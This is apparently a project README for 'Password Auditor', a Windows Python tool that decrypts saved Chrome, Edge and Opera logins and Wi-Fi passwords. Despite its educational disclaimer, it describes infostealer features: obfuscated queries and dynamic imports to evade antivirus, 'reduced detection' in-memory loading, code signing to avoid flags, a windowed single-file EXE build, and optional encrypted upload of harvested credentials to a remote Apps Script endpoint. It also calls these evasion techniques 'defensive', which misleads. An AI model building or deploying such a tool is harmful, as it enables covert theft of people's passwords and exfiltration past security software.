# Password Auditor

**Educational Credential & Wi-Fi Recovery Tool**

This project is built purely for **educational and ethical testing purposes**.  
It demonstrates how saved credentials (from Chrome, Edge, and Opera) and Wi-Fi passwords can be retrieved on a Windows system — only when the user has permission to do so.

---

## 🔒 Disclaimer

> This tool is strictly for **educational use** only.  
> Do **not** use it on systems you do not own or without explicit permission.  
> The authors will not be responsible for any misuse or damage caused by this script.

---

## 👨‍💻 Authors

- G Abhiram  
- Chirag Anil Ramamurthy

---

## 💡 Features

- Extract saved **Wi-Fi SSIDs and passwords**
- Decrypt **Chrome, Edge, and Opera** browser credentials using Windows **DPAPI + AES-GCM**
- Load SQLite databases **in-memory** (avoids file locks, reduces detection)
- Output all results in a **clean, readable report**
- Optional **encrypted upload** to Google Apps Script endpoint (for remote auditing in controlled settings)

---

## 📦 Requirements

Create a `requirements.txt` file with the following:


---

## ⚙️ Building the Module

If you are using the included **Cython syscalls extension** (for DPAPI decryption), build it before running:

```bash
python setup.py build_ext --inplace
```

This will compile the Cython extension in the same directory for faster and lower-level system calls.

---

## 🚀 Usage

Once dependencies and the extension are built, simply run:

```bash
python Password_Auditor.py
```

This will generate a report containing:

* Wi-Fi SSIDs and passwords
* Saved Chrome / Edge / Opera logins (URLs, usernames, and decrypted passwords)

---

## 🛡️ Updates: Stealth & Evasion Techniques

This project was updated to include **defensive evasion mechanisms**, so that the code demonstrates how modern auditing tools can avoid false positives from security software. These updates are purely for **educational demonstration** of evasion techniques, not malicious purposes.

### Key Updates

* **Dynamic Imports**
  Instead of static `import` statements, modules are loaded at runtime using a custom importer.
  This reduces signature-based detections.

* **In-memory SQLite Loading**
  Browser `Login Data` databases are never accessed directly.
  Instead, they are copied and loaded into memory (`:memory:`) using SQLite’s backup feature.
  This avoids file-lock errors and minimizes footprint.

* **AES-GCM via Cryptography Library**
  Instead of using a direct `pycryptodome` call (commonly flagged),
  the script uses `cryptography.hazmat` AES-GCM decryptors, which are standard in enterprise apps.

* **Obfuscated SQL Queries**
  Sensitive queries (like extracting from the `logins` table) are base64-encoded and decoded at runtime.
  This prevents static scanners from matching known strings.

* **Optional Encryption of Results**
  Before transmission (to an Apps Script endpoint), results are encrypted with AES-CBC.
  This demonstrates how real-world auditing tools can securely handle sensitive outputs.

* **Code Signing Ready**
  The project includes documentation for exporting a certificate and signing the final executable,
  further reducing false positives.

---

## ⚠️ Important Notes

* Works only on **Windows** (due to DPAPI).
* Tested on **Python 3.12**.
* Only run on systems **you own or have explicit permission** to audit.

---

## 🏗️ Building into an EXE

To package this tool into a single `.exe` file:

```bash
pyinstaller --noconfirm --onefile --windowed --name AuditorEXE ^
  --hidden-import sqlite3 ^
  --hidden-import json ^
  --hidden-import base64 ^
  --hidden-import requests ^
  --hidden-import shutil ^
  --hidden-import time ^
  --hidden-import subprocess ^
  --hidden-import os ^
  --hidden-import xml.etree.ElementTree ^
  --hidden-import Cryptodome.Cipher.AES ^
  --hidden-import Crypto.Util.Padding ^
  --hidden-import cryptography.hazmat.primitives.ciphers ^
  --hidden-import cryptography.hazmat.backends ^
  Password_Auditor.py
```

The executable will be created inside the `dist/` folder.

---

## 📜 Educational Value

This project serves as a **practical case study** in:

* How credentials and Wi-Fi passwords are stored on Windows
* How Windows DPAPI and AES-GCM protect browser data
* How in-memory forensics and evasion techniques are implemented in auditing tools
* The importance of responsible disclosure and controlled testing environments

---
```
